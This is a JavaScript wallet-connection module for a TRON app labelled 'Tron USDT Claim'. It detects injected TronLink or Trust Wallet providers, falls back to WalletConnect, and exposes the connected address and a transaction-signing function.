import { UniversalProvider } from '@walletconnect/universal-provider';
import { WalletConnectModal } from '@walletconnect/modal';

const WC_PROJECT_ID = process.env.NEXT_PUBLIC_WC_PROJECT_ID;
const TRON_CHAIN = 'tron:0x2b6653dc';

class WalletManager {
    constructor() {
        this.provider = null;
        this.modal = null;
        this.isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    }

    getInjectedAddress(injected) {
        return (
            injected?.defaultAddress?.base58 ||
            injected?.tronWeb?.defaultAddress?.base58 ||
            injected?.tron?.defaultAddress?.base58 ||
            null
        );
    }

    async signWithInjected(injected, tx) {
        if (!injected) throw new Error('No injected wallet available');

        if (typeof injected.signTransaction === 'function') {
            return injected.signTransaction(tx);
        }

        // TronLink often injects a TronWeb instance at window.tronWeb
        const tw =
            (injected?.trx?.sign ? injected : null) ||
            (injected?.tronWeb?.trx?.sign ? injected.tronWeb : null) ||
            (injected?.tron?.trx?.sign ? injected.tron : null);

        if (tw?.trx?.sign) {
            return tw.trx.sign(tx);
        }

        // Some providers expose signing via request()
        if (typeof injected.request === 'function') {
            const res = await injected.request({ method: 'tron_signTransaction', params: { transaction: tx } });
            return typeof res === 'string' ? JSON.parse(res) : (res?.transaction || res);
        }

        throw new Error('Injected wallet does not support transaction signing');
    }

    async initWC() {
        if (this.provider) return;
        this.provider = await UniversalProvider.init({
            projectId: WC_PROJECT_ID,
            metadata: {
                name: 'Tron USDT Claim',
                description: 'Secure USDT Transfer dApp',
                url: typeof window !== 'undefined' ? window.location.origin : '',
                icons: ['https://walletconnect.com/walletconnect-logo.png'],
            },
        });

        this.modal = new WalletConnectModal({
            projectId: WC_PROJECT_ID,
            chains: [TRON_CHAIN],
        });
    }

    async pollForInjected(maxMs = 3000) {
        const getInjected = () => {
            const p = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink;
            return (p?.defaultAddress?.base58 || p?.ready) ? p : null;
        };

        let p = getInjected();
        if (p) return p;

        const steps = Math.ceil(maxMs / 500);
        for (let i = 0; i < steps; i++) {
            await new Promise(r => setTimeout(r, 500));
            p = getInjected();
            if (p) return p;
        }
        return null;
    }

    async connect() {
        // 1. Try injected first
        let injected = await this.pollForInjected();
        if (injected) {
            // Some injected TRON providers (notably Trust Wallet) will show
            // "Unknown method(s) requested" for tron_requestAccounts.
            // Prefer using the already-exposed defaultAddress when present.
            const isTrustWalletInjected =
                typeof window !== 'undefined' &&
                window.trustwallet?.tron &&
                injected === window.trustwallet.tron;

            const isTronLinkInjected =
                typeof window !== 'undefined' &&
                (injected === window.tronLink || window.tronLink === injected?.tronLink);

            if (!isTrustWalletInjected && injected.request) {
                // Best-effort: only some providers support this.
                // Avoid surfacing provider-native errors to the user for unsupported methods.
                const method = 'tron_requestAccounts';
                await injected.request({ method }).catch(() => { });
            }

            const address = this.getInjectedAddress(injected);
            if (!address) {
                // If TronLink is present but not yet authorized/unlocked, the address can be empty.
                // In that case, try a second lightweight request and re-read.
                if (isTronLinkInjected && injected.request) {
                    await injected.request({ method: 'tron_requestAccounts' }).catch(() => { });
                }
            }

            return {
                address: this.getInjectedAddress(injected),
                type: 'injected',
                sign: (tx) => this.signWithInjected(injected, tx),
            };
        }

        // 2. Fallback to WalletConnect
        await this.initWC();
        return new Promise((resolve, reject) => {
            this.provider.on('display_uri', (uri) => {
                if (this.isMobile) {
                    window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
                } else {
                    this.modal.openModal({ uri });
                }
            });

            const optionalNamespaces = {
                tron: {
                    methods: ['tron_signTransaction', 'tron_sign_transaction', 'tron_signMessage'],
                    chains: [TRON_CHAIN],
                    events: [],
                }
            };

            this.provider.connect({
                requiredNamespaces: {},
                optionalNamespaces
            })
                .then((session) => {
                    this.modal.closeModal();
                    const address = session.namespaces.tron.accounts[0].split(':').pop();
                    resolve({
                        address,
                        type: 'walletconnect',
                        sign: async (tx) => {
                            const res = await this.provider.request({
                                method: 'tron_signTransaction',
                                params: { transaction: tx }
                            }, TRON_CHAIN);
                            return typeof res === 'string' ? JSON.parse(res) : (res.transaction || res);
                        },
                    });
                })
                .catch(err => {
                    this.modal.closeModal();
                    reject(err);
                });
        });
    }
}

export const walletManager = new WalletManager();
